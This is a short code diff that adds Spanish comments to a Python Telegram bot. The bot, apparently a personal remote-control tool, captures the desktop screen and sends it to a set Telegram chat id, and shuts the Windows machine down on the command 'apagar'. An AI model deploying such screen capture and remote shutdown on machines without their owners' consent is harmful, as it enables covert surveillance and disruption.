@@ -13,7 +13,7 @@ numero = len(lista_envio) #calcula la cantidad de elementos de esta variable(dir
 nombreCarpeta = "botTelegram"
     
 
-token = ""
+token = "" #aqui va el token que se consigue en botfather(va entre comillas)
 bot = telebot.TeleBot(token)
 #contadorMensajes = 1
 def handle_messages(messages):
@@ -33,7 +33,7 @@ def handle_messages(messages):
                 im = pyscreenshot.grab()
                 im.save('captura1.png')
                 photo = open("C:/Users/Alex/Desktop/Telegram/"+nombreCarpeta+"/captura1.png", "rb")
-                bot.send_photo(chatidipropio, photo) #para que mande la foto al usuario se debe cambiar chatidpropio por chatid
+                bot.send_photo(chatidipropio, photo) #para que mande la foto al usuario que esta interactuando con el chatbot se debe cambiar chatidpropio por chatid
             if text == "apagar":
                     os.system("shutdown /s /t 1")
             if text == "/e x i t":
